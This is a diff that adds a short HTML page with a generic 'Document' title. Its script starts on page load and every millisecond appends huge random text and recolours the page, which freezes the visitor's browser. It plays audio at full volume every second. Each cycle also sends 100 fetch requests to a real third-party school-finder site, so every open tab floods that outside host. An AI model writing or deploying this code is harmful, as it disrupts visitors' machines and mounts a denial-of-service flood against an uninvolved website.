@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%qwertyuiopasdfghjklzxcvbnm";
+
+        function downloadFile(name, content) {
+
+            const blob = new Blob([content], {
+                type: "text/plain"
+            });
+
+            const url = URL.createObjectURL(blob);
+
+            const a = document.createElement("a");
+            a.href = url;
+            a.download = name + ".txt";
+
+            document.body.appendChild(a);
+            a.click();
+
+            a.remove();
+            setTimeout(() => URL.revokeObjectURL(url), 1000);
+        }
+
+        function get1(d) {
+            for (let i = 1; i <= 100; i++) {
+                fetch("https://webview.schoolconnex.app/SchoolFinder/")
+            }
+        }
+
+        function run(length = 10000) {
+            let result = "";
+            let result1 = "";
+
+            const h1 = document.createElement("h1");
+
+            const color = "#" + Math.floor(
+                Math.random() * 16777215
+            ).toString(16).padStart(6, "0");
+
+            const color1 = "#" + Math.floor(
+                Math.random() * 16777215
+            ).toString(16).padStart(6, "0");
+        
+            for (let i = 0; i < length; i++) {
+                result += chars[Math.floor(Math.random() * chars.length)];
+            }
+        
+            document.title = result;
+            h1.textContent = result;
+            h1.style.color = color;
+
+            document.body.style.background = color1;
+
+            document.body.appendChild(h1);
+
+            get1(result1)
+        }
+
+        function run1() {
+            const audio1 = new Audio("sound1.mp3");
+            audio1.volume = 1;
+            audio1.play().catch(error => {
+                console.log("Audio error:", error);
+            });
+        }
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            setInterval(() => run(), 1);
+            setInterval(() => run1(), 1000);
+        })
+    </script>
+</body>
+</html>
